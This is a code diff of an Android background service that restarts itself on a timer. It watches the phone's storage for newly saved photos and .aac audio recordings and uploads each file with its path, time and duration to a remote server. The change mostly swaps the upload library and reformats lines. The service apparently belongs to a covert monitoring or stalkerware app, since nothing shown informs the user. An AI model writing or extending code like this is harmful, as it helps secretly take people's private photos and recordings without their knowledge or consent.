@@ -1,11 +1,18 @@
 package custom.fileobserver;
 
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
+
+import com.inet.android.request.AppConstants;
+import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.ConvertDate;
+import com.inet.android.utils.Logging;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -14,19 +21,10 @@ import android.content.Intent;
 import android.media.MediaMetadataRetriever;
 import android.os.Environment;
 import android.os.IBinder;
-import android.util.Log;
-
-import com.inet.android.request.AppConstants;
-import com.inet.android.request.RequestList;
-import com.inet.android.utils.AppSettings;
-import com.inet.android.utils.ConvertDate;
-import com.inet.android.utils.Logging;
-import com.loopj.android.http.RequestParams;
 
 public class FileObserverService extends Service {
 	private static final int SERVICE_REQUEST_CODE = 21;
-	private final static String LOG_TAG = FileObserverService.class
-			.getSimpleName().toString();
+	private final static String LOG_TAG = FileObserverService.class.getSimpleName().toString();
 	private int isImageObserver = 0;
 	private int isAudioObserver = 0;
 	private FileObserver fileObs = null;
@@ -48,23 +46,19 @@ public class FileObserverService extends Service {
 		// ---------------------------------------------------
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE, 3);// через 5 минут
-		PendingIntent servicePendingIntent = PendingIntent.getService(this,
-				SERVICE_REQUEST_CODE, new Intent(this,
-						FileObserverService.class),// SERVICE_REQUEST_CODE
-													// -
-													// уникальный
-													// int
-													// сервиса
+		PendingIntent servicePendingIntent = PendingIntent.getService(this, SERVICE_REQUEST_CODE,
+				new Intent(this, FileObserverService.class), // SERVICE_REQUEST_CODE
+																// -
+																// уникальный
+																// int
+																// сервиса
 				PendingIntent.FLAG_UPDATE_CURRENT);
 
 		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
-		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
-				servicePendingIntent);
+		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), servicePendingIntent);
 
-		isImageObserver = AppSettings.getState(AppConstants.TYPE_IMAGE_REQUEST,
-				this);
-		isAudioObserver = AppSettings.getState(AppConstants.TYPE_AUDIO_REQUEST,
-				this);
+		isImageObserver = AppSettings.getState(AppConstants.TYPE_IMAGE_REQUEST, this);
+		isAudioObserver = AppSettings.getState(AppConstants.TYPE_AUDIO_REQUEST, this);
 
 		if (isImageObserver == 0 && isAudioObserver == 0) {
 			Logging.doLog(LOG_TAG, "stop watcher", "stop watcher");
@@ -80,8 +74,7 @@ public class FileObserverService extends Service {
 				Logging.doLog(LOG_TAG, "state true", "state true");
 			}
 		} else {
-			Logging.doLog(LOG_TAG, "fileObs start watcher",
-					"fileObs start watcher");
+			Logging.doLog(LOG_TAG, "fileObs start watcher", "fileObs start watcher");
 			startWatcher();
 
 		}
@@ -96,20 +89,17 @@ public class FileObserverService extends Service {
 	public void startWatcher() {
 		Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");
 
-		String sdcard = Environment.getExternalStorageDirectory()
-				.getAbsolutePath();
-		String sdcard2 = "/sdcard2";
+		String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
 		String sdcardMnt = "/mnt/sdcard2";
 		String sdcardExt = "/mnt/extSdCard";
-		String sdcardSd = "/sdcard/.externalSD";
-
+		
 		List<String> dirList = new ArrayList<String>();
-//		List<String> folder = new ArrayList<String>();
+		// List<String> folder = new ArrayList<String>();
 		dirList.add(sdcard);
-		dirList.add(sdcard2);
+//		dirList.add(sdcard2);
 		dirList.add(sdcardMnt);
 		dirList.add(sdcardExt);
-		dirList.add(sdcardSd);
+//		dirList.add(sdcardSd);
 		// for (String item : dirList) {
 		// if (item != null)
 		// folder.addAll(RecursiveSearch.recursiveFileFind(item));
@@ -121,8 +111,7 @@ public class FileObserverService extends Service {
 			File file = new File(item);
 			if (file.exists() && file.isDirectory()) {
 
-				Logging.doLog(LOG_TAG, "FileWatcher = create " + item,
-						"FileWatcher = create" + item);
+				Logging.doLog(LOG_TAG, "FileWatcher = create " + item, "FileWatcher = create" + item);
 				int event = FileObserver.CLOSE_WRITE | FileObserver.CREATE;
 				fileObs = new FileObserver(item, true, event) {
 					@Override
@@ -142,23 +131,18 @@ public class FileObserverService extends Service {
 	private void filterFile(int event, String path) {
 		int typeValue = -1;
 		if (!path.endsWith(".txt")) {
-			Logging.doLog(LOG_TAG, "event: " + event + " path " + path,
-					"event: " + event + " path " + path);
+			Logging.doLog(LOG_TAG, "event: " + event + " path " + path, "event: " + event + " path " + path);
 
-			if (path.endsWith(".jpg") || path.endsWith(".png")
-					|| path.endsWith(".gif") || path.endsWith(".bpm")) {
+			if (path.endsWith(".jpg") || path.endsWith(".png") || path.endsWith(".gif") || path.endsWith(".bpm")) {
 				Logging.doLog(LOG_TAG, "image:" + path, "image:" + path);
 
 				if (event == FileObserver.CREATE)
 					AppSettings.setLastImageFile(path);
 				else if (event == FileObserver.CLOSE_WRITE) {
-					Logging.doLog(LOG_TAG, "Last image "
-							+ AppSettings.getLastImageFile().equals(path),
-							"Last image "
-									+ AppSettings.getLastImageFile().equals(path));
+					Logging.doLog(LOG_TAG, "Last image " + AppSettings.getLastImageFile().equals(path),
+							"Last image " + AppSettings.getLastImageFile().equals(path));
 
-					if (AppSettings.getLastImageFile().equals(path)
-							&& isImageObserver == 1) {
+					if (AppSettings.getLastImageFile().equals(path) && isImageObserver == 1) {
 						try {
 							TimeUnit.MILLISECONDS.sleep(1000);
 						} catch (InterruptedException e) {
@@ -172,11 +156,9 @@ public class FileObserverService extends Service {
 				}
 			}
 			if (path.endsWith(".aac") && isAudioObserver == 1) {
-				Logging.doLog(LOG_TAG,
-						"path.endsWith(.aac) && audio.equals(1) " + event,
+				Logging.doLog(LOG_TAG, "path.endsWith(.aac) && audio.equals(1) " + event,
 						"path.endsWith(.aac) && audio.equals(1)" + event);
-				Logging.doLog(LOG_TAG, "data[audio]: " + event + " " + path,
-						"data[audio]: " + event + "image:" + path);
+				Logging.doLog(LOG_TAG, "data[audio]: " + event + " " + path, "data[audio]: " + event + "image:" + path);
 				if (event == FileObserver.CREATE)
 					AppSettings.setLastCreateAudioFile(path);
 				else if (event == FileObserver.CLOSE_WRITE) {
@@ -187,26 +169,20 @@ public class FileObserverService extends Service {
 				}
 			}
 			if (typeValue != -1) {
-				RequestParams params = new RequestParams();
-				try {
-					params.put("data[][time]", ConvertDate.logTime());
-					params.put("data[][type]", typeValue);
-					if (typeValue == AppConstants.TYPE_AUDIO_REQUEST) {
-						int second = getDuration(path);
-						if (second != -1)
-							params.put("data[][duration]", second);
-						else
-							return;
-					}
-					params.put("data[][path]", path);
-					params.put("key", System.currentTimeMillis());
-					params.put("data[][file]", new File(path));
+				Map<String, Object> file = new HashMap<String, Object>();
+				Map<String, Object> payloadMap = new HashMap<String, Object>();
 
-					RequestList.sendFileRequest(params, this);
-				} catch (FileNotFoundException e) {
-					Log.d(LOG_TAG, "FileNotFoundException");
-					e.printStackTrace();
+				file.put("type", typeValue);
+				file.put("time", ConvertDate.logTime());
+				file.put("path", path);
+				if (typeValue == AppConstants.TYPE_AUDIO_REQUEST) {
+					int second = getDuration(path);
+					if (getDuration(path) != -1)
+						file.put("duration", second);
 				}
+				payloadMap.put("file", path);
+				RequestList.sendDataRequest(file, payloadMap, this);
+
 			}
 		}
 	}
@@ -215,8 +191,7 @@ public class FileObserverService extends Service {
 		try {
 			MediaMetadataRetriever retriever = new MediaMetadataRetriever();
 			retriever.setDataSource(path);
-			String time = retriever
-					.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
+			String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
 			int timeInmillisec = (int) Long.parseLong(time);
 			int duration = timeInmillisec / 1000;
 			int hours = duration / 3600;
